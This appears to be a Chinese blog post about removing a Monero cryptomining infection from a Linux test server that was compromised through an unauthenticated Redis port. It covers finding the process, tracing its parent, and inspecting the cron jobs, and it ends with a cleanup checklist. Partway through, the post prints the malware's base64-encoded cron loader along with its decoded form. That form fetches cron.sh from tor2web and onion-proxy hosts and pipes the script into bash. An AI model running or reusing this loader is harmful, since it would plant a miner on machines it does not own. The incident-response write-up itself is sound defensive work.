---
layout: post
title: "Virus病毒查杀"
tags: DevOps Virus
---

## 简介  
----
* 小伙伴们，大家好，今天分享一次Linux系统杀毒的经历，还有个人的一些总结，希望对大家有用。
* 我遇到的一个挖矿的病毒，在挖一种叫门罗币（XMR）的数字货币，行情走势请看 <https://www.feixiaohao.com/currencies/monero>，该病毒的特征是会占满你的CPU。
* 该病毒的侵入方式是通过扫描主机的Redis端口，一般默认为6379，通过Redis命令将程序注入到你的主机，对的，没有设置密码的那种，我们的测试环境主机就因此中招。


## 病毒的发现和侦破

1. 起初，收到cpu的报警信息，于是先登录到阿里云上，查看了该机器的情况，发现了注入命令
1. 解决这种问题很简单，给redis增加认证，或不暴露redis的端口
![img-w500](/images/201906040633.png)

1. 登录服务器，使用 `top` 命令查看程序资源占用率
![img-w500](/images/201906051721.png)

1. 发现有一个程序资源占用率比较高，查看其进程pid，然后使用 `pstree -H 18682 -g`，查看高亮的行；此步骤目的要看其父进程，以便找到其父进程，并将其杀掉
![img-w500](/images/201906050527.png)

1. 使用命令 `kill -9 18682` 将该进程杀掉，可是过了一段时间，它又启动了
1. 查看 /etc 下定时任务中最近被改动过的文件 `find /etc/cron* -type f -mtime -30`
1. 发现有文件被改动过，打开查看其中内容，看到有定时任务，打开定时任务执行的文件，如下
![img-w500](/images/201906050544.png)
1. 查看crontab，查看 `/var/lib/corn` 下定时任务，该目录下定时任务为所有用户的定时任务，查看定时任务的内容，查看定时任务执行文件的内容，如下
![img-w500](/images/201906051759.png)
1. 此两个文件内容完全一样，代码如下
```bash
#!/bin/bash
exec &>/dev/null
{echo,ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4Kc2xlZXAgJCgoUkFORE9NICUgNjAwKSkKKHdnZXQgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSByYXBpZDdjcGZxbnd4b2RvLnRvcjJ3ZWIuaW8vY3Jvbi5zaCB8fCBjdXJsIC1mc1NMa0EtIHJhcGlkN2NwZnFud3hvZG8udG9yMndlYi5pby9jcm9uLnNoIHx8IHdnZXQgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSByYXBpZDdjcGZxbnd4b2RvLmQyd2ViLm9yZy9jcm9uLnNoIHx8IGN1cmwgLWZzU0xrQS0gcmFwaWQ3Y3BmcW53eG9kby5kMndlYi5vcmcvY3Jvbi5zaCB8fCB3Z2V0IC1xVS0gLU8tIC0tbm8tY2hlY2stY2VydGlmaWNhdGUgcmFwaWQ3Y3BmcW53eG9kby5vbmlvbi53cy9jcm9uLnNoIHx8IGN1cmwgLWZzU0xrQS0gcmFwaWQ3Y3BmcW53eG9kby5vbmlvbi53cy9jcm9uLnNoICl8YmFzaAo=}|{base64,-d}|bash
```
1. 可以看出，该代码是通过base64编码的
1. 解码后得到如下结果
```bash
echo ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4Kc2xlZXAgJCgoUkFORE9NICUgNjAwKSkKKHdnZXQgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSByYXBpZDdjcGZxbnd4b2RvLnRvcjJ3ZWIuaW8vY3Jvbi5zaCB8fCBjdXJsIC1mc1NMa0EtIHJhcGlkN2NwZnFud3hvZG8udG9yMndlYi5pby9jcm9uLnNoIHx8IHdnZXQgLXFVLSAtTy0gLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSByYXBpZDdjcGZxbnd4b2RvLmQyd2ViLm9yZy9jcm9uLnNoIHx8IGN1cmwgLWZzU0xrQS0gcmFwaWQ3Y3BmcW53eG9kby5kMndlYi5vcmcvY3Jvbi5zaCB8fCB3Z2V0IC1xVS0gLU8tIC0tbm8tY2hlY2stY2VydGlmaWNhdGUgcmFwaWQ3Y3BmcW53eG9kby5vbmlvbi53cy9jcm9uLnNoIHx8IGN1cmwgLWZzU0xrQS0gcmFwaWQ3Y3BmcW53eG9kby5vbmlvbi53cy9jcm9uLnNoICl8YmFzaAo= | base64 -d
exec &>/dev/null
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
sleep $((RANDOM % 600))
(wget -qU- -O- --no-check-certificate rapid7cpfqnwxodo.tor2web.io/cron.sh || curl -fsSLkA- rapid7cpfqnwxodo.tor2web.io/cron.sh || wget -qU- -O- --no-check-certificate rapid7cpfqnwxodo.d2web.org/cron.sh || curl -fsSLkA- rapid7cpfqnwxodo.d2web.org/cron.sh || wget -qU- -O- --no-check-certificate rapid7cpfqnwxodo.onion.ws/cron.sh || curl -fsSLkA- rapid7cpfqnwxodo.onion.ws/cron.sh )|bash
```
如图
![img-w500](/images/201906050634.png)
1. 经过分析，上述代码是要从网络上下载可执行程序
1. 通过查看命令的帮助文档，使用 `curl -LkA `
## 病毒清理的总结

1. top查找占用资源较多的进程pid
1. 通过pstree -H PID -a查看高亮部分，查看其可疑父进程及相关执行命令（也可通过/proc/PID/下文件查看）
1. 查看被修改的 find /etc/cron* -type f -mtime -30
1. crontab中如果是正常命令，可能为篡改命令，通过m5dsum COMMAND和正常机器命令校验，更新命令
1. 更新或清除crontab中命令相关文件
1. 清除crontab内容
1. kill掉病毒pid和其可疑父进程pid; kill -9 PID PPID